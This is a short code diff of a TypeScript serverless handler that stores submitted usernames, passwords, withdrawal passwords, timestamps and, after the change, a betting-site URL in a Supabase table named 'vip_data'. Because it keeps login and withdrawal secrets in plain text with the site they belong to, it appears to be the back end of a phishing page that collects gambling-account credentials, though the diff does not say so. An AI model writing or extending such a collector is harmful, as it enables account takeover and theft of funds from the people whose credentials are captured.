@@ -17,11 +17,11 @@ export default async (req: IncomingMessage, res: ServerResponse) => {
     
     req.on('end', async () => {
       try {
-        const { user, pass, withdraw_pass, timestamp } = JSON.parse(body);
+        const { user, pass, withdraw_pass, timestamp, bet_url } = JSON.parse(body);
 
         const { error } = await supabase
           .from('vip_data')
-          .insert([{ user, pass, withdraw_pass, timestamp }]);
+          .insert([{ user, pass, withdraw_pass, timestamp, bet_url }]);
 
         if (error) throw error;
 
